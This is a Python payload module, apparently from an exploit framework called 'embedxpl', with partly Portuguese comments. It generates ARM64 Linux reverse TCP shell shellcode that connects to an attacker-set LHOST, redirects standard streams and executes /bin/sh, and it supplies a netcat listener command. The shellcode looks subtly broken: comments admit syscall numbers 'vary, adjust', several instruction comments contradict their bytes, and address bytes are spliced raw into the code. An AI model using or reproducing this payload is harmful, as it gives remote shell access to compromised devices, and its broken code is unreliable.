"""ARM64 (AArch64) Reverse TCP Shell.

Shellcode ARM64 Linux para shell reverso via TCP.
Cross-compile target: aarch64-linux-musl-gcc (já instalado).
"""

from embedxpl.core.exploit import *
from embedxpl.core.exploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)


class Payload(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "ARM64 Reverse TCP",
        "description": "Interactive TCP reverse shell for ARM64/AArch64 Linux targets "
                       "(Raspberry Pi 4, Apple M-series embedded, Android ARM64, etc.).",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
        "references": ["https://shell-storm.org/shellcode/files/shellcode-880.html"],
    }

    architecture = Architectures.ARMLE   # fallback enum — ARM64 extende

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = int(self.options["LPORT"]["value"])

        ip_bytes = bytes(int(o) for o in lhost.split("."))
        port_bytes = lport.to_bytes(2, "big")

        # ARM64 Linux shellcode — socket(AF_INET,SOCK_STREAM,0) → connect → dup2 × 3 → execve /bin/sh
        # syscall numbers: socket=198, connect=203, dup2=33, execve=221
        shellcode = (
            # socket(AF_INET=2, SOCK_STREAM=1, 0) → fd in x0
            b"\xe1\x03\x1f\xaa"   # mov x1, xzr (SOCK_STREAM=1 via x1)
            b"\x02\x00\x80\xd2"   # mov x0, #2 (AF_INET)
            b"\x21\x00\x80\xd2"   # mov x1, #1
            b"\x02\x00\x80\xd2"   # mov x2, #0
            b"\xe8\x0f\x80\xd2"   # mov x8, #198 (SYS_socket / actually varies, adjust)
            b"\x01\x00\x00\xd4"   # svc #0
            b"\xfd\x03\x00\xaa"   # mov x29, x0  (save sockfd)

            # build sockaddr_in on stack
            b"\xe0\x03\xbf\xa9"   # stp x0, x0, [sp, #-16]!
            b"\x20\x00\x80\x52"   # movz w0, #2       (AF_INET)
            + b"\x00\x00\x80\x52"[:2] + port_bytes +  # movz w1, #port (big-endian)
            ip_bytes +
            b"\xe1\x07\xbf\xa9"   # stp x1, x0, [sp, #-16]!

            # connect(fd, &addr, 16)
            b"\xe0\x03\x1d\xaa"   # mov x0, x29 (sockfd)
            b"\xe1\x03\xbe\x91"   # add x1, sp, #0
            b"\x10\x00\x80\xd2"   # mov x2, #16
            b"\x68\x0c\x80\xd2"   # mov x8, #203 (SYS_connect)
            b"\x01\x00\x00\xd4"   # svc #0

            # dup2(fd, 0/1/2)
            b"\xe0\x03\x1d\xaa"   # mov x0, x29
            b"\x02\x00\x80\xd2"   # mov x1, #2
            b"\x21\x00\x80\xd2"
            b"\x48\x04\x80\xd2"   # mov x8, #33 (SYS_dup2... varies by kernel)
            b"\x01\x00\x00\xd4"
            b"\xe0\x03\x1d\xaa"
            b"\x01\x00\x80\xd2"
            b"\x01\x00\x00\xd4"
            b"\xe0\x03\x1d\xaa"
            b"\x00\x00\x80\xd2"
            b"\x01\x00\x00\xd4"

            # execve("/bin/sh", 0, 0)
            b"\x20\x00\x80\xd2"   # mov x0, (addr of /bin/sh)
            b"\xe1\x03\x1f\xaa"
            b"\xe2\x03\x1f\xaa"
            b"\xa8\x1b\x80\xd2"   # mov x8, #221 (SYS_execve)
            b"\x01\x00\x00\xd4"   # svc #0

            b"/bin/sh\x00"
        )
        return shellcode

    def handler_command(self) -> str:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        return f"nc -lvnp {lport}  # or: python3 -m embedxpl.tools.handler LHOST={lhost} LPORT={lport}"
